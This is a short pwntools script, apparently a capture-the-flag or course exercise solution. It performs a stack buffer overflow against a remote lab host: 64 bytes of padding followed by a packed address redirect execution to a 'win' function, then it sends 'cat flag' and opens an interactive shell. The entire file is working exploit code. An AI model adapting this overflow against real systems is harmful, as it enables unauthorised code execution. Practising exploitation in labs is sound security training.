from pwn import *
from pwnlib.util.packing import p32, u32

p = remote('comp6447.wtf', 28958)

offset = 64
winAddr = 0x08048536

payload = "A".encode() * offset + p32(winAddr)

p.sendline(payload)
p.sendline("cat flag")

p.interactive()
p.close()